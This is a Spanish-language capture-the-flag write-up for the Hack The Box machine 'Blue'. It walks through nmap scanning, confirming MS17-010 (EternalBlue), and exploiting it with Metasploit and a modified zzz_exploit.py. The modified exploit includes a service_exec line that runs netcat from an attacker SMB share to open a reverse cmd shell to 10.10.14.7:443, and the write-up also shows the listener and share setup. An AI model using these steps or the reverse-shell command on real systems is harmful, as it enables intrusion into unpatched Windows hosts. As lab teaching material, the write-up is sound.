## Información Box

| **Parámetros** | **Características**                              |
| -------------- | ------------------------------------------------ |
| OS             | Windows                                          |
| Dificultad     | Easy                                             |
| Creador        | ch4p                                             |
| Link           | [Blue](https://www.hackthebox.com/machines/blue) |

## Introducción
Blue es un CTF disponible en diversas plataformas, conocido por su dificultad fácil. En esta máquina, se requiere explotar la vulnerabilidad MS17-010 para obtener una shell con privilegios de System. A lo largo del proceso, aprenderemos a enumerar la vulnerabilidad MS17-010 en la máquina utilizando Nmap, en una primera instancia se utilizara  Metasploit, y también se realizara escalamiento de privilegios a nivel de administrador con un script en Python.

## Requisitos previos
Creamos **directorios** para poder almacenar los diferentes archivos de trabajo maquina.

```bash
> mkdir nmap content script exploits
> export blue="10.129.230.92"
```

## Reconocimiento
Para ver a que tipo de maquina estamos explorando, realizamos una traza ICMP hacia la maquina y como se puede observar el TTL es de 127, que esta en el rango de una maquina Windows.

![img](./img/blue/Pasted%20image%2020240526145148.png)

Realizamos el respectivo reconocimiento con `nmap`.

```bash
nmap -p- -sV -sC --open -sS -vvv -Pn $blue -oN escaneo
```

Al finalizar obtenemos el siguiente escaneo, donde se puede observar los puertos que se tienen abiertos a nivel de maquina, los cuales en este caso nos interesan los puertos 135, 139, 445.

```python
Nmap scan report for 10.129.230.92
Host is up, received user-set (0.098s latency).
Scanned at 2024-05-26 15:54:06 EDT for 104s
Not shown: 65447 closed tcp ports (reset), 79 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE      REASON          VERSION
135/tcp   open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds syn-ack ttl 127 Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49153/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49154/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49155/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49156/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49157/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-05-26T20:55:46+01:00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 23691/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 4775/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 25778/udp): CLEAN (Timeout)
|   Check 4 (port 58031/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2024-05-26T19:55:44
|_  start_date: 2024-05-26T19:48:46
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: -19m56s, deviation: 34m36s, median: 1s
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```

Como se puede observar, el servicio `smb` está presente, lo cual es muy común en los servicios de Windows. Además, hay otros puertos abiertos típicos de un servidor de Windows. Hemos logrado obtener información sobre la versión del sistema operativo de la máquina, que es `Windows 7 Professional`.

Se conoce que el protocolo `smb` utiliza el puerto `445`. En este laboratorio, nos enfocaremos en escalar privilegios mediante este protocolo.

## Enumeración de SMB
Realizamos un escaneo al protocolo SMB, que es comúnmente utilizado por los sistemas Windows para compartir archivos, impresoras y otros recursos en la red. Ejecutamos todos los scripts de `nmap` para `smb-vuln`, los cuales buscan vulnerabilidades conocidas en servicios SMB. También utilizamos el escaneo `-sT` para conexión TCP, un método más confiable en comparación con otros tipos de escaneo. Sin embargo, este método es más lento y puede ser detectado por sistemas de seguridad. En este caso, optamos por este tipo de escaneo para identificar las vulnerabilidades presentes.

```bash
nmap -p445 -script=smb-vuln-\* -sT $blue -oN smbScan
```

Obtenemos la siguiente salida al ejecutar el comando y podemos observar la vulnerabilidad que podemos utilizar para explotar este servicio.

```python
Nmap scan report for 10.129.230.92
Host is up (0.097s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
|_smb-vuln-ms10-054: false
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND
```

Se puede observar al finalizar el escaneo, que posee una vulnerabilidad con CVE de `CVE:CVE-2017-0143`.

Podemos observar otros recursos de la maquina con `crackmapexec`

```bash
❯ crackmapexec smb $ip
SMB         10.10.10.40     445    HARIS-PC         [*] Windows 7 Professional 7601 Service Pack 1 x64 (name:HARIS-PC) (domain:haris-PC) (signing:False) (SMBv1:True)
```

## Explotación utilizando el framework de Metasploit
En este apartado vamos ayudarnos de la herramienta de `Metasploit`, para poder explotar esta maquina, realizamos la búsqueda de la vulnerabilidad en la base de datos de Metasploit.

![img](./img/blue/Pasted%20image%2020240526151354.png)

Vamos a utilizar el `exploit 0`, y configuramos los parámetros necesarios para realizar el escalamiento.

![img](./img/blue/Pasted%20image%2020240526151714.png)

Configuración de los parámetros, con ayuda de Metasploit se logra tener una conexión al servidor, y lograr tener el respectivo acceso al sistemas.

![img](./img/blue/Pasted%20image%2020240526152443.png)

Luego de obtener acceso a la maquina por medio de Metasploit, se puede observar que tenemos acceso a la línea de comandos de Windows, con lo cual ahora podemos acceder a los diferentes directorios del sistema.

![img](./img/blue/Pasted%20image%2020240526161044.png)

Navegamos  por los directorios del sistema, y logramos acceder como `Administrator` de Windows, obteniendo los máximos privilegios del sistema.

![img](./img/blue/Pasted%20image%2020240526161242.png)

## Explotación utilizando script de Python
Para explotar la vulnerabilidad `Eternalblue` en sistemas operativos Windows 7, utilizaremos una aplicación desarrollada en Python. Procederemos a analizar esta vulnerabilidad a continuación y podrás descargar la herramienta desde el siguiente [repositorio](https://github.com/worawit/MS17-010/tree/master).

El exploit que nos ayudará a obtener acceso se llama `zzz_exploit.py`. Es importante tener en cuenta que la vulnerabilidad permite el acceso para un usuario anónimo.

![img](./img/blue/Pasted%20image%2020240626114511.png)

Al comprobar las ejecución de comandos con python2 y tener instalados las diferentes herramientas, nos debe de arrojar las siguientes opciones, primer paso para la comprobación de funcionamiento del script se debe de ejecutar `checker.py`, el cual nos arroja si el funcionamiento que se  va a realizar es correcto o no.

Las librerías utilizadas son las siguientes, las cuales no están instaladas y deben de instalarse, se debe de utilizar python2 para poder ejecutar este script y las librerías de `impacket`, para el funcionamiento del script.

La librería de `impacket` es muy utilizada para poder interactuar con protocolos de red de bajo nivel, como en este caso de SMB.

```python
# importada dentro de los paquetes del repositorio para manejo de smb
from mysmb import MYSMB
# Utilizacion de libreria impacket
from impacket import smb, smbconnection, nt_errors
from impacket.uuid import uuidtup_to_bin
from impacket.dcerpc.v5.rpcrt import DCERPCException
```

![img](./img/blue/Pasted%20image%2020240626123158.png)

Luego de configurar las dependencias debemos de hacer unos cambios al script `checker.py`, donde se deben de configurar algunas variables dentro del código, para hacer ejecutar adecuadamente el script.

![img](./img/blue/Pasted%20image%2020240626123347.png)

Ahora se puede observar que el funcionamiento del script ya nos arroja cosas positivas con las cuales podemos seguir avanzando en el escalamiento de privilegios, se obtiene varios `OK`, que ya nos permiten seguir avanzando, tenemos un namepy `samr` que podemos utilizarlo.

![img](./img/blue/Pasted%20image%2020240626124219.png)

Para poder correr ahora el Exploit `zzz_exploit.py` para obtener acceso a la maquina , debemos de realizar los siguientes cambios, y agregar el usuario `guest` en la variable `USERNAME`.

```python
#!/usr/bin/python
from impacket import smb, smbconnection
from mysmb import MYSMB
from struct import pack, unpack, unpack_from
import sys
import socket
import time

'''
MS17-010 exploit for Windows 2000 and later by sleepya

Note:
- The exploit should never crash a target (chance should be nearly 0%)
- The exploit use the bug same as eternalromance and eternalsynergy, so named pipe is needed

Tested on:
- Windows 2016 x64
- Windows 10 Pro Build 10240 x64
- Windows 2012 R2 x64
- Windows 8.1 x64
- Windows 2008 R2 SP1 x64
- Windows 7 SP1 x64
- Windows 2008 SP1 x64
- Windows 2003 R2 SP2 x64
- Windows XP SP2 x64
- Windows 8.1 x86
- Windows 7 SP1 x86
- Windows 2008 SP1 x86
- Windows 2003 SP2 x86
- Windows XP SP3 x86
- Windows 2000 SP4 x86
'''

USERNAME = 'guest'
PASSWORD = '
```

Y modificar la función `smb_pwn` con los siguientes cambios, donde se configurara la carga de un netcat para Windows y poder obtener el acceso al mismo tiempo que escuchamos desde nuestra maquina atacante con un netcat y por el puerto 443.

```python
def smb_pwn(conn, arch):
        smbConn = conn.get_smbconnection()

		# Esta ejecucion de servicio nos permite cargar el archivo descargado de netcat para Windows y cargarlo en la maquina objetivo y ejecutarlo.
        service_exec(conn, r'cmd /c \\10.10.14.7\smbFolder\nc.exe -e cmd 10.10.14.7 443')
```

Preparamos los ambientes de trabajo para trabajar con netcat, del siguiente link [netcat windows](https://eternallybored.org/misc/netcat/) y lo descargamos en la versión `netcat 1.12`.

Al descomprimir estos archivos en el directorio de trabajo obtenemos los siguientes resultados.

![img](./img/blue/Pasted%20image%2020240626131739.png)

Pasar los archivos desde la maquina de trabajo a la maquina objetivo
```bash
impacket-smbserver smbFolder $(pwd) -smb2support
```

Y también colocamos a escuchar un `netcat` en la maquina host
```bash
rlwrap nc -nlvp 443
```

Luego ejecutarnos nuestro Exploit para poder obtener los accesos a la maquina.
```bash
python2 zzz_exploit.py 10.10.10.40 samr
```

Finalmente se ha logrado obtener los privilegios de acceso dentro de la maquina Windows 7.

![img](./img/blue/Pasted%20image%2020240626134517.png)

Al finalizar este proceso, se puede observar que esta vulnerabilidad de **EternalBlue**, nos permite tener acceso como usuario administrador `nt authority\system`, con lo cual podemos proceder a tener una escalabilidad tanto horizontal dentro del sistema, proponiendo tener persistencia dentro de la maquina.
